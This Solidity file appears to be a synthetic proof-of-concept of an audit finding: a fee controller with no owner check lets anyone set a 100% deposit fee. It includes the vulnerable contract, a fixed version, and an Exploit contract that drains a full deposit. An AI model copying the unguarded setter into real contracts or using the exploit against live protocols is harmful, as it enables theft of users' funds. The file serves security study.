// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  OctoDeFi FeeController — setFunctionFeeConfig has no onlyOwner
    (Cyfrin, #61597, July 2025).
    SYNTHETIC, cheatcode-free, one block.
    Anyone writes the fee for the deposit selector. The cap is 10000 bps,
    so 100% is accepted. The next deposit of N = 100e18 pays the whole
    amount to the executor. Control is onlyOwner and reverts the write.
    The deposit then keeps all 100e18 in the vault. */

contract Asset {
    string public constant name = "Asset";
    string public constant symbol = "AST";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

enum FeeType {
    Percent
}

struct FeeConfig {
    FeeType feeType;
    uint256 feePercentage;
}

error FeePercentageExceedLimit();

contract FeeController {
    mapping(FeeType => uint256) public maxFeeLimits;
    mapping(bytes4 => FeeConfig) public functionFeeConfigs;

    constructor() {
        maxFeeLimits[FeeType.Percent] = 10000;
    }

    function setFunctionFeeConfig(bytes4 _selector, FeeType _feeType, uint256 _feePercentage) external {
        if (_feePercentage > maxFeeLimits[_feeType]) {
            revert FeePercentageExceedLimit();
        }

        // @> VULN: no onlyOwner. The caller sets the deposit fee to 100%.
        functionFeeConfigs[_selector] = FeeConfig(_feeType, _feePercentage);
    }
}

error NotOwner();

contract FeeControllerFixed {
    mapping(FeeType => uint256) public maxFeeLimits;
    mapping(bytes4 => FeeConfig) public functionFeeConfigs;
    address public owner;

    constructor(address owner_) {
        owner = owner_;
        maxFeeLimits[FeeType.Percent] = 10000;
    }

    function setFunctionFeeConfig(bytes4 _selector, FeeType _feeType, uint256 _feePercentage) external {
        if (msg.sender != owner) revert NotOwner();
        if (_feePercentage > maxFeeLimits[_feeType]) {
            revert FeePercentageExceedLimit();
        }
        functionFeeConfigs[_selector] = FeeConfig(_feeType, _feePercentage);
    }
}

contract Depositor {
    function approveToken(address token, address spender, uint256 amount) external {
        Asset(token).approve(spender, amount);
    }
}

contract Vault {
    Asset public token;
    FeeController public fees;

    constructor(Asset token_, FeeController fees_) {
        token = token_;
        fees = fees_;
    }

    function deposit(address user, uint256 amount) external {
        token.transferFrom(user, address(this), amount);
        (, uint256 pct) = fees.functionFeeConfigs(this.deposit.selector);
        uint256 fee = amount * pct / 10000;
        if (fee != 0) {
            token.transfer(msg.sender, fee);
        }
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;
    uint256 public constant FULL = 10000;

    Asset public token;
    FeeController public fees;
    Vault public vault;
    Depositor public user;
    uint256 public taken;

    constructor() {
        token = new Asset();
        fees = new FeeController();
        vault = new Vault(token, fees);
        user = new Depositor();
    }

    function run() external {
        token.mint(address(user), N);
        user.approveToken(address(token), address(vault), N);

        bytes4 sel = vault.deposit.selector;
        fees.setFunctionFeeConfig(sel, FeeType.Percent, FULL);
        (, uint256 pct) = fees.functionFeeConfigs(sel);
        require(pct == FULL, "fee not 100%");

        vault.deposit(address(user), N);
        taken = token.balanceOf(address(this));
        require(taken == N, "did not take N");
        require(token.balanceOf(address(vault)) == 0, "vault kept funds");
        require(token.balanceOf(address(user)) == 0, "user kept funds");
    }
}
